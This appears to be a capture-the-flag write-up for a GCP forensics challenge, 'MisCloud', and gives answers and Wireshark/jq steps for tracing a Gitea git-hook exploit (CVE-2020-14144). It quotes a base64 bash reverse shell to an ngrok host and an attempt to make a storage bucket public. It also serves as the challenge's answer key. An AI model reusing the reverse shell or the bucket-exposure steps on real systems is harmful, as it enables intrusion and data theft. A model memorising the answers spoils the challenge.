# MisCloud

## Speech
```
My name is John. I am a student who started an e-commerce startup business named "DummyExample" with my partner, James. Initially, I was using WordPress and shared hosting. After experiencing good traffic, I decided to migrate from WordPress to a customized website on Google Cloud Platform (GCP). Currently, my partner and I are working on the website, contributing to a Gitea server hosted on GCP. I migrated all customer data to cloud storage. Recently, my data was breached, and I have no clue how it happened or what was vulnerable. My GCP infrastructure consists of five VM instances and a single Cloud Storage. There is one Windows machine for my partner to use, with very restricted permissions over GCP, only allowing access to his Gitea account. I have two Linux machines for my work, one for hosting the Gitea server and another for packet mirroring. All the machines have public IPs but very restricted access due to firewalls in place. Due to budget constraints, I can't use the Google Security Command Center service, so I am providing you with the VPC network traffic capture and the Google Cloud logs.
```

## Questions
1. What's the private IP address of the Windows machine?
    > 10.128.0.3
    - 
2. Which CVE was exploited by the threat actor?
    > CVE-2020-14144
    - I used this filter on wireshark : `(ip.src == 10.128.0.3) and http and http.request.method == POST` and I saw this command : `Form item: "content" = "#!/bin/bash\r\necho 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5ldS5uZ3Jvay5pby8xNDUwOSAwPiYxICY=' | base64 --decode | bash"` which looks a lot like a rev shell, then I search for `"settings/hooks/git/post-receive"` (the endpoint exploited) and find this CVE
3. What is the hostname and port number to which the reverse shell was connecting?
    > 0.tcp.eu.ngrok.io:14509
    - Decode the previous base64
4. From which IP address was the CVE exploited, and is this threat an insider or outsider attack?
    > 10.128.0.3:insider
    - 
5. Which account helped the threat actor to pivot?
    > 257145238219-compute@developer.gserviceaccount.com
    - After his rev shell he must have made a 'whoami' (simple assumption) so I filtered with `frame contains "whoami"` in wireshark then I followed the TCP stream and find this adress used after the whoami
6. Which machines did the threat actor log into? (sorted alphabetically)
    > linux-machine1,linux-machine2,packet-mirror-instance
    - By using this command we can see each action of the account, in the resourceName we have the machine name:
    ```bash
    $ jq '[.[] | select(.protoPayload.authenticationInfo.principalEmail == "257145238219-compute@developer.gserviceaccount.com") | {
    ip: .protoPayload.requestMetadata.callerIp,
    timestamp: .timestamp,
    serviceName: .protoPayload.serviceName,
    methodName: .protoPayload.methodName,
    resourceName: .protoPayload.resourceName
    }]' GCloud_Logs.json
    ```

7. What's the original name of the sensitive file?
    > Customer-Data-e7b9e806c08435793e310d7137b068fa.xlsx
    - `jq '[.[].protoPayload.resourceName] | group_by(.) | map({resourceName: .[0], count: length}) | sort_by(.count) | reverse' GCloud_Logs.json`
8. Which gcloud role did the threat actor try to assign to the storage bucket to make it publicly accessible?
    > roles/storage.legacyObjectReader
    - with this command we see every actions taken on the bucket: `jq '[.[] | select(.protoPayload.resourceName != null) | select(.protoPayload.resourceName | contains("sensitive-ecomuser-data"))]' GCloud_Logs.json`
    - Then we have to scroll quite a lot to see an action of adding a role :
    ```
    "resourceName": "projects/_/buckets/sensitive-ecomuser-data/objects/Customer-Data-e7b9e806c08435793e310d7137b068fa.xlsx",
    "bindingDeltas": [
        {"action": "ADD",
        "role": "roles/storage.legacyObjectReader",
        "member": "allUsers"}
    ]

    ```
9. Which account led to the cloud storage data breach?
    > storage-svc-acc@qwiklabs-gcp-00-848c1b920007.iam.gserviceaccount.com
    - after the role adding, we continue to scroll and see this account getting the files
10. Which port number was exploited by the attacker to exfiltrate data that is allowed by default ingress traffic rules in the default VPC network?
    > 3389
    - in wireshark search for "cusdata.xlsx.enc" which is the file exfiltrate and check the ports
11. What is the key to decrypt the encrypted file?
    > J@m37_h@Rd3st_k3Y_enCrypt_Exf!l7r@73
    - In the HTTP files we have a cusdata.xlsx.enc file, we cat the beginning and see the key (a bit scrumbled but after some try in cyberchef we unxored it izily)
12. What are the SSN and credit card numbers of "Founder John"?
    > HTB-FR-SRLK:1111-3345-1234-5123
    - By opening the unxored file
13. Which Google Cloud service is an alternative to Gitea?
    > Cloud Source Repositories
    - Ask ChatGPT
14. Is it safe to use the Default Compute Engine Service Account on VM instances?
    > No
    - 
15. Which Google Cloud service restricts data exfiltration from Cloud Storage?
    > VPC Service Controls
    - Ask ChatGPT